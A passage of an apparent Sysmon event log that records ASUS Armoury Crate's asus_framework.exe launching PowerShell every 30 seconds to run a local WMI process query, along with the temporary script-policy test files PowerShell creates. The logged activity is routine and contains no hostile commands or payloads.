+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:48:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:48:31.344
+ProcessGuid: {7f6f9216-561f-687d-6108-000000006901}
+ProcessId: 20844
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_y2vdys3g.5kl.ps1
+CreationUtcTime: 2025-07-20 20:48:31.343
+User: SHARON\Shxro"
+"20/07/2025 21:48:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:48:31.268
+ProcessGuid: {7f6f9216-561f-687d-6108-000000006901}
+ProcessId: 20844
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:48:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:48:01.344
+ProcessGuid: {7f6f9216-5601-687d-5f08-000000006901}
+ProcessId: 7772
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_j25u0kuw.3yq.ps1
+CreationUtcTime: 2025-07-20 20:48:01.344
+User: SHARON\Shxro"
+"20/07/2025 21:48:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:48:01.268
+ProcessGuid: {7f6f9216-5601-687d-5f08-000000006901}
+ProcessId: 7772
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:47:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:47:31.338
+ProcessGuid: {7f6f9216-55e3-687d-5308-000000006901}
+ProcessId: 17380
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_ks0uohrp.lo5.ps1
+CreationUtcTime: 2025-07-20 20:47:31.338
+User: SHARON\Shxro"
+"20/07/2025 21:47:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:47:31.265
+ProcessGuid: {7f6f9216-55e3-687d-5308-000000006901}
+ProcessId: 17380
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:47:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:47:01.328
+ProcessGuid: {7f6f9216-55c5-687d-5008-000000006901}
+ProcessId: 5556
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_oc4nyijf.pbg.ps1
+CreationUtcTime: 2025-07-20 20:47:01.327
+User: SHARON\Shxro"
+"20/07/2025 21:47:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:47:01.254
+ProcessGuid: {7f6f9216-55c5-687d-5008-000000006901}
+ProcessId: 5556
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:46:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:46:31.315
+ProcessGuid: {7f6f9216-55a7-687d-4e08-000000006901}
+ProcessId: 27256
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_zc1l1pbb.cqx.ps1
+CreationUtcTime: 2025-07-20 20:46:31.315
+User: SHARON\Shxro"
+"20/07/2025 21:46:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:46:31.241
+ProcessGuid: {7f6f9216-55a7-687d-4e08-000000006901}
+ProcessId: 27256
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:46:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:46:01.307
+ProcessGuid: {7f6f9216-5589-687d-4b08-000000006901}
+ProcessId: 6740
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_ncqejwq2.ojg.ps1
+CreationUtcTime: 2025-07-20 20:46:01.307
+User: SHARON\Shxro"
+"20/07/2025 21:46:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:46:01.234
+ProcessGuid: {7f6f9216-5589-687d-4b08-000000006901}
+ProcessId: 6740
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:45:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:45:31.308
+ProcessGuid: {7f6f9216-556b-687d-4908-000000006901}
+ProcessId: 5768
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_kuqn0mjv.hni.ps1
+CreationUtcTime: 2025-07-20 20:45:31.308
+User: SHARON\Shxro"
+"20/07/2025 21:45:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:45:31.234
+ProcessGuid: {7f6f9216-556b-687d-4908-000000006901}
+ProcessId: 5768
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:45:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:45:01.308
+ProcessGuid: {7f6f9216-554d-687d-4708-000000006901}
+ProcessId: 22712
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_h0gan4pg.40t.ps1
+CreationUtcTime: 2025-07-20 20:45:01.308
+User: SHARON\Shxro"
+"20/07/2025 21:45:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:45:01.234
+ProcessGuid: {7f6f9216-554d-687d-4708-000000006901}
+ProcessId: 22712
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:44:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:44:31.297
+ProcessGuid: {7f6f9216-552f-687d-4508-000000006901}
+ProcessId: 23640
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_u2ux3dgb.n1f.ps1
+CreationUtcTime: 2025-07-20 20:44:31.297
+User: SHARON\Shxro"
+"20/07/2025 21:44:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:44:31.223
+ProcessGuid: {7f6f9216-552f-687d-4508-000000006901}
+ProcessId: 23640
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:44:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:44:01.294
+ProcessGuid: {7f6f9216-5511-687d-4308-000000006901}
+ProcessId: 26084
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_cftkqrpx.s1x.ps1
+CreationUtcTime: 2025-07-20 20:44:01.294
+User: SHARON\Shxro"
+"20/07/2025 21:44:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:44:01.220
+ProcessGuid: {7f6f9216-5511-687d-4308-000000006901}
+ProcessId: 26084
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:43:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:43:31.279
+ProcessGuid: {7f6f9216-54f3-687d-4108-000000006901}
+ProcessId: 28448
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_jd5ypsgn.p2d.ps1
+CreationUtcTime: 2025-07-20 20:43:31.279
+User: SHARON\Shxro"
+"20/07/2025 21:43:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:43:31.207
+ProcessGuid: {7f6f9216-54f3-687d-4108-000000006901}
+ProcessId: 28448
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:43:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:43:01.269
+ProcessGuid: {7f6f9216-54d5-687d-3f08-000000006901}
+ProcessId: 20712
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_a5auugvf.whk.ps1
+CreationUtcTime: 2025-07-20 20:43:01.269
+User: SHARON\Shxro"
+"20/07/2025 21:43:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:43:01.193
+ProcessGuid: {7f6f9216-54d5-687d-3f08-000000006901}
+ProcessId: 20712
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:42:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:42:31.257
+ProcessGuid: {7f6f9216-54b7-687d-3d08-000000006901}
+ProcessId: 27572
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_3zprq1mw.etl.ps1
+CreationUtcTime: 2025-07-20 20:42:31.257
+User: SHARON\Shxro"
+"20/07/2025 21:42:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:42:31.183
+ProcessGuid: {7f6f9216-54b7-687d-3d08-000000006901}
+ProcessId: 27572
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:42:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:42:01.243
+ProcessGuid: {7f6f9216-5499-687d-2c08-000000006901}
+ProcessId: 25624
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_mdovjaoe.l0x.ps1
+CreationUtcTime: 2025-07-20 20:42:01.243
+User: SHARON\Shxro"
+"20/07/2025 21:42:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:42:01.170
+ProcessGuid: {7f6f9216-5499-687d-2c08-000000006901}
+ProcessId: 25624
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:41:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:41:31.230
+ProcessGuid: {7f6f9216-547b-687d-2a08-000000006901}
+ProcessId: 28600
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_hoklchhz.zoq.ps1
+CreationUtcTime: 2025-07-20 20:41:31.230
+User: SHARON\Shxro"
+"20/07/2025 21:41:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:41:31.157
+ProcessGuid: {7f6f9216-547b-687d-2a08-000000006901}
+ProcessId: 28600
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:41:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:41:01.233
+ProcessGuid: {7f6f9216-545d-687d-2808-000000006901}
+ProcessId: 27716
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_tux1x5x4.wou.ps1
+CreationUtcTime: 2025-07-20 20:41:01.233
+User: SHARON\Shxro"
+"20/07/2025 21:41:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:41:01.155
+ProcessGuid: {7f6f9216-545d-687d-2808-000000006901}
+ProcessId: 27716
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
